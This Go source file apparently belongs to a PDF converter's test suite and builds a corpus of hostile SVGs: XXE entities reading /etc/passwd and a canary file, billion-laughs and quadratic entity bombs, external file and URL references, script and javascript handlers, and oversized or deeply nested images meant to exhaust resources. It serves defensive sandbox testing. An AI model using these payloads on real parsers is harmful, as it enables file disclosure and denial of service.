// Package svgcorpus is the SVG attack corpus: hostile SVG files that the
// Gateway pre-check and the Worker sandbox are tested with. It is test
// support, not part of the service. The payloads point at a canary file and
// an HTTP address that the caller picks at test time, so a leak can be
// recognised by content and a request by a listener.
package svgcorpus

import (
	"bytes"
	"compress/zlib"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"hash/crc32"
	"strings"

	"github.com/taskmedia/outline-latex-pdf/internal/images"
)

const (
	header = `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100" viewBox="0 0 100 100"`
	// Accepted is the Precheck value of an attack the Gateway lets through,
	// which the Worker alone must contain.
	Accepted = ""
)

// Attack is one hostile SVG.
type Attack struct {
	Name string
	SVG  []byte
	// Precheck is the error kind the Gateway pre-check answers with, or
	// Accepted.
	Precheck string
	// Heavy attacks need real memory or time to hurt and are run only where
	// the container limits apply.
	Heavy bool
}

// Target is where the payloads point.
type Target struct {
	// CanaryPath is a file the converter must not read.
	CanaryPath string
	// URL is an HTTP address the converter must not request.
	URL string
}

// Attacks returns the corpus for a target.
func Attacks(t Target) []Attack {
	var all []Attack
	for _, group := range [][]Attack{entityAttacks(t), referenceAttacks(t), activeContentAttacks(), sizeAttacks(), structureAttacks(), bombAttacks()} {
		all = append(all, group...)
	}
	return all
}

func svg(attrs, body string) []byte { return []byte(header + attrs + ">" + body + "</svg>") }

func entityAttacks(t Target) []Attack {
	xxe := func(name, system string) Attack {
		doc := fmt.Sprintf(`<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "%s">]>`, system) +
			string(svg("", `<text x="5" y="50">&xxe;</text>`))
		return Attack{Name: name, SVG: []byte(doc), Precheck: images.KindSVGRejected}
	}
	parameter := fmt.Sprintf(`<!DOCTYPE svg [<!ENTITY %% remote SYSTEM "%s"> %%remote;]>`, t.URL) + string(svg("", ""))
	return []Attack{
		xxe("xxe file canary", "file://"+t.CanaryPath),
		xxe("xxe passwd", "file:///etc/passwd"),
		xxe("xxe http", t.URL),
		{Name: "xxe parameter entity", SVG: []byte(parameter), Precheck: images.KindSVGRejected},
		{Name: "billion laughs", SVG: billionLaughs(10), Precheck: images.KindSVGRejected},
		{Name: "quadratic blowup", SVG: quadraticBlowup(), Precheck: images.KindSVGRejected, Heavy: true},
	}
}

func billionLaughs(levels int) []byte {
	var b strings.Builder
	b.WriteString(`<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY l0 "lol">`)
	for i := 1; i < levels; i++ {
		fmt.Fprintf(&b, `<!ENTITY l%d "%s">`, i, strings.Repeat(fmt.Sprintf("&l%d;", i-1), 10))
	}
	fmt.Fprintf(&b, `]>%s`, svg("", fmt.Sprintf(`<text x="5" y="50">&l%d;</text>`, levels-1)))
	return []byte(b.String())
}

func quadraticBlowup() []byte {
	doc := `<!DOCTYPE svg [<!ENTITY a "` + strings.Repeat("a", 50000) + `">]>` +
		string(svg("", `<text>`+strings.Repeat("&a;", 5000)+`</text>`))
	return []byte(doc)
}

func referenceAttacks(t Target) []Attack {
	file := "file://" + t.CanaryPath
	ref := func(name, body string) Attack {
		return Attack{Name: name, SVG: svg("", body), Precheck: images.KindSVGRejected}
	}
	return []Attack{
		ref("image file", `<image href="`+file+`" width="50" height="50"/>`),
		ref("image xlink file", `<image xlink:href="`+file+`" width="50" height="50"/>`),
		ref("image http", `<image href="`+t.URL+`/x.png" width="50" height="50"/>`),
		ref("image relative parent", `<image href="../../../../etc/passwd" width="50" height="50"/>`),
		ref("image sibling file", `<image href="img-2.png" width="50" height="50"/>`),
		ref("image svg data", `<image href="data:image/svg+xml;base64,`+base64.StdEncoding.EncodeToString(svg("", `<rect/>`))+`" width="5" height="5"/>`),
		ref("use file", `<use href="`+file+`#a"/>`),
		ref("use http", `<use xlink:href="`+t.URL+`/x.svg#a"/>`),
		ref("feImage file", `<filter id="f"><feImage href="`+file+`"/></filter><rect width="9" height="9" filter="url(#f)"/>`),
		ref("css import http", `<style>@import url(`+t.URL+`/a.css);</style><rect width="9" height="9"/>`),
		ref("css import file", `<style>@import "`+file+`";</style><rect width="9" height="9"/>`),
		ref("css url file", `<style>rect{fill:url(`+file+`)}</style><rect width="9" height="9"/>`),
		ref("style attribute url http", `<rect width="9" height="9" style="fill:url(`+t.URL+`/p)"/>`),
		ref("font-face src", `<style>@font-face{font-family:x;src:url(`+file+`)}</style><text font-family="x">a</text>`),
		{Name: "xml-stylesheet", SVG: []byte(`<?xml-stylesheet type="text/css" href="` + t.URL + `/a.css"?>` + string(svg("", ""))), Precheck: images.KindSVGRejected},
	}
}

func activeContentAttacks() []Attack {
	rejected := func(name, attrs, body string) Attack {
		return Attack{Name: name, SVG: svg(attrs, body), Precheck: images.KindSVGRejected}
	}
	return []Attack{
		rejected("script", "", `<script>alert(1)</script>`),
		rejected("script cdata", "", `<script><![CDATA[ document.location="http://example.invalid" ]]></script>`),
		rejected("foreignObject", "", `<foreignObject width="50" height="50"><iframe xmlns="http://www.w3.org/1999/xhtml" src="file:///etc/passwd"></iframe></foreignObject>`),
		rejected("onload handler", ` onload="alert(1)"`, ``),
		rejected("onclick handler", "", `<rect width="9" height="9" onclick="alert(1)"/>`),
		rejected("anchor javascript", "", `<a href="javascript:alert(1)"><rect width="9" height="9"/></a>`),
	}
}

func sizeAttacks() []Attack {
	return []Attack{
		{Name: "huge viewBox", SVG: []byte(`<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 1000000000 1000000000"><rect width="9" height="9"/></svg>`), Precheck: images.KindSVGRejected},
		{Name: "huge width", SVG: []byte(`<svg xmlns="http://www.w3.org/2000/svg" width="1e9" height="1e9"><rect width="9" height="9"/></svg>`), Precheck: images.KindSVGRejected},
		{Name: "huge width in inches", SVG: []byte(`<svg xmlns="http://www.w3.org/2000/svg" width="900000in" height="900000in"><rect width="9" height="9"/></svg>`), Precheck: images.KindSVGRejected},
		{Name: "over two MiB", SVG: []byte(string(svg("", `<!-- `)) + strings.Repeat("x", 2<<20) + ` -->`), Precheck: images.KindTooLarge},
		{Name: "giant path data", SVG: giantPath(), Precheck: Accepted},
		{Name: "many elements", SVG: svg("", strings.Repeat("<g/>", 110_000)), Precheck: images.KindSVGRejected},
		{Name: "huge embedded raster", SVG: embeddedRaster(12_000, 12_000), Precheck: images.KindSVGRejected, Heavy: true},
	}
}

func giantPath() []byte {
	var d strings.Builder
	d.WriteString("M0 0")
	for i := 0; d.Len() < 1_800_000; i++ {
		fmt.Fprintf(&d, " L%d %d", i%97, (i*7)%89)
	}
	return svg("", `<path d="`+d.String()+`" fill="none" stroke="black"/>`)
}

func structureAttacks() []Attack {
	return []Attack{
		{Name: "deeply nested groups", SVG: svg("", strings.Repeat("<g>", 200)+`<rect width="9" height="9"/>`+strings.Repeat("</g>", 200)), Precheck: images.KindSVGRejected},
		{Name: "nested groups below the limit", SVG: svg("", strings.Repeat("<g>", 40)+`<rect width="9" height="9"/>`+strings.Repeat("</g>", 40)), Precheck: Accepted},
		{Name: "nested filters", SVG: nestedFilters(24, 3000), Precheck: Accepted, Heavy: true},
		{Name: "nested clip paths and masks", SVG: nestedMasks(60), Precheck: Accepted},
		{Name: "nested patterns", SVG: nestedPatterns(14), Precheck: Accepted},
		{Name: "circular use", SVG: svg("", `<g id="a"><use href="#b"/></g><g id="b"><use href="#a"/></g><use href="#a"/>`), Precheck: images.KindSVGRejected},
		{Name: "circular gradient references", SVG: svg("", `<linearGradient id="a" href="#b"/><linearGradient id="b" href="#a"/><rect width="9" height="9" fill="url(#a)"/>`), Precheck: Accepted},
	}
}

func nestedFilters(depth, side int) []byte {
	var b strings.Builder
	b.WriteString(`<filter id="f"><feGaussianBlur stdDeviation="40"/><feMorphology radius="20"/></filter>`)
	for range depth {
		b.WriteString(`<g filter="url(#f)">`)
	}
	b.WriteString(`<rect width="900" height="900" fill="red"/>`)
	b.WriteString(strings.Repeat("</g>", depth))
	return []byte(fmt.Sprintf(`<svg xmlns="http://www.w3.org/2000/svg" width="%d" height="%d" viewBox="0 0 %d %d">%s</svg>`, side, side, side, side, b.String()))
}

func nestedMasks(depth int) []byte {
	var b strings.Builder
	for i := range depth {
		next := ""
		if i > 0 {
			next = fmt.Sprintf(` mask="url(#m%d)" clip-path="url(#c%d)"`, i-1, i-1)
		}
		fmt.Fprintf(&b, `<clipPath id="c%d"><rect width="90" height="90"%s/></clipPath><mask id="m%d"><rect width="90" height="90" fill="white"%s/></mask>`, i, next, i, next)
	}
	fmt.Fprintf(&b, `<rect width="90" height="90" mask="url(#m%d)" clip-path="url(#c%d)"/>`, depth-1, depth-1)
	return svg("", b.String())
}

// nestedPatterns paints each pattern with several rectangles that use the
// previous pattern, so the work doubles per level.
func nestedPatterns(depth int) []byte {
	var b strings.Builder
	b.WriteString(`<pattern id="p0" width="2" height="2" patternUnits="userSpaceOnUse"><rect width="1" height="1"/></pattern>`)
	for i := 1; i <= depth; i++ {
		fmt.Fprintf(&b, `<pattern id="p%d" width="4" height="4" patternUnits="userSpaceOnUse"><rect width="2" height="2" fill="url(#p%d)"/><rect x="2" y="2" width="2" height="2" fill="url(#p%d)"/></pattern>`, i, i-1, i-1)
	}
	fmt.Fprintf(&b, `<rect width="100" height="100" fill="url(#p%d)"/>`, depth)
	return svg("", b.String())
}

func bombAttacks() []Attack {
	return []Attack{
		{Name: "use bomb", SVG: svg("", useBomb(12, 10)), Precheck: images.KindSVGRejected},
		{Name: "use bomb below the pre-check", SVG: svg("", useBomb(4, 10)), Precheck: Accepted},
	}
}

func useBomb(depth, fanout int) string {
	var b strings.Builder
	b.WriteString(`<g id="l0"><rect width="1" height="1"/></g>`)
	for i := 1; i <= depth; i++ {
		fmt.Fprintf(&b, `<g id="l%d">`, i)
		for range fanout {
			fmt.Fprintf(&b, `<use href="#l%d"/>`, i-1)
		}
		b.WriteString(`</g>`)
	}
	fmt.Fprintf(&b, `<use href="#l%d"/>`, depth)
	return b.String()
}

// embeddedRaster is an SVG with a grey PNG of the given size: a few hundred
// KiB compressed, hundreds of MiB decoded.
func embeddedRaster(w, h int) []byte {
	var raw bytes.Buffer
	zw := zlib.NewWriter(&raw)
	row := make([]byte, 1+w)
	for range h {
		zw.Write(row)
	}
	zw.Close()
	var png bytes.Buffer
	png.WriteString("\x89PNG\r\n\x1a\n")
	ihdr := make([]byte, 13)
	binary.BigEndian.PutUint32(ihdr[0:], uint32(w))
	binary.BigEndian.PutUint32(ihdr[4:], uint32(h))
	ihdr[8] = 8 // bit depth; colour type 0 is grey
	writeChunk(&png, "IHDR", ihdr)
	writeChunk(&png, "IDAT", raw.Bytes())
	writeChunk(&png, "IEND", nil)
	return svg("", `<image width="100" height="100" href="data:image/png;base64,`+base64.StdEncoding.EncodeToString(png.Bytes())+`"/>`)
}

func writeChunk(w *bytes.Buffer, kind string, data []byte) {
	_ = binary.Write(w, binary.BigEndian, uint32(len(data)))
	w.WriteString(kind)
	w.Write(data)
	_ = binary.Write(w, binary.BigEndian, crc32.ChecksumIEEE(append([]byte(kind), data...)))
}
